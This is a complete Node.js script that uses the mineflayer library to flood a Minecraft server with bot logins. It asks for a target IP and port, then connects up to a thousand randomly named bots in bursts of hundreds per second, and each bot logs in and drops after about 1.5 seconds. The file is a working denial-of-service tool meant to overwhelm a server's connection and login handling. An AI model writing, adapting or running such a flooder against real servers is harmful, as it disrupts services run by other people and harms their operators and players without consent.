const mineflayer = require('mineflayer');
const readline = require('readline');

function randomName() {
  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let name = '';
  for (let i = 0; i < 15; i++) {
    name += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return name;
}

async function spawnBot(host, port, id) {
  return new Promise((resolve) => {
    const bot = mineflayer.createBot({
      host,
      port,
      username: randomName(),
      version: false,
      keepAlive: false,
    });

    bot.once('login', () => {
      console.log(`[${id}] Logged in as ${bot.username}`);
      setTimeout(() => bot.quit('Bye'), 1500);
    });

    bot.once('end', () => resolve());
    bot.once('error', () => resolve());
  });
}

async function burstSpawn(host, port, totalBots, botsPerSecond, delayMs) {
  let spawned = 0;

  while (spawned < totalBots) {
    let burstCount = Math.min(botsPerSecond, totalBots - spawned);
    console.log(`Spawning burst of ${burstCount} bots...`);

    for (let i = 0; i < burstCount; i++) {
      spawned++;
      spawnBot(host, port, spawned);
    }

    await new Promise((r) => setTimeout(r, delayMs));
  }

  console.log('Finished spawning all bots.');
}

function ask(question) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  return new Promise((resolve) => rl.question(question, (answer) => {
    rl.close();
    resolve(answer);
  }));
}

async function main() {
  const hostInput = await ask('Target IP (default 127.0.0.1): ');
  const host = hostInput.trim() || '127.0.0.1';

  const portInput = await ask('Target port (default 25565): ');
  const port = Number(portInput.trim()) || 25565;

  const totalInput = await ask('Total bots to spawn (default 1000): ');
  const totalBots = Number(totalInput.trim()) || 1000;

  const bpsInput = await ask('Bots per second (burst size, default 500): ');
  const botsPerSecond = Number(bpsInput.trim()) || 500;

  const delayInput = await ask('Delay between bursts in ms (default 1000): ');
  const delayMs = Number(delayInput.trim()) || 1000;

  console.log(`Starting to spawn ${totalBots} bots in bursts of ${botsPerSecond} every ${delayMs}ms`);

  await burstSpawn(host, port, totalBots, botsPerSecond, delayMs);
}

main();